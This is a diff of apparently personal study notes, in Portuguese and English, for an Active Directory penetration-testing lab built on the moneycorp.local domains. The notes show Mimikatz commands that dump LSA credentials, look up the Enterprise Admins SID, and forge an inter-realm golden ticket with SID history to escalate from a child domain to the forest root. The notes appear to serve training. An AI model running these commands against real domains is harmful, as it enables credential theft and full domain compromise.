@@ -3076,17 +3076,15 @@ ou
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
 ```
-ENCONTRAR O SID DO GRUPO "Enterprise Admins" DO DOMINIO PARENTE (NA MINHA MÁQUINA)
+3. ENCONTRAR O SID DO GRUPO "Enterprise Admins" DO DOMINIO PARENTE (NA MINHA MÁQUINA)
 - For finding the SID of the "Enterprise Admins" group you can find the SID of the root domain and set it in S-1-5-21-<root domain>-519:
 - You could also use the Domain Admins groups, which ends in 512.
 ```
 get-netgroup -fulldata -GroupName "Enterprise Admins" -Domain moneycorp.local
 get-netgroup -fulldata -GroupName "Enterprise Admins" -Domain moneycorp.local | select samaccountname,objectsid
 ```
-__________
-Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
-__________
-MIMIKATZ - CRIAR UM TICKET INTER-REALM TGT
+Exemplo: Domain: MONEYCORP.LOCAL (mcorp / S-1-5-21-280534878-1496970234-700767426)
+4. MIMIKATZ - CRIAR UM TICKET INTER-REALM TGT
 ```
 Kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e6b82e5d09e03817aab44dc809ded34a /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\trust_tkt.kirbi
 ```
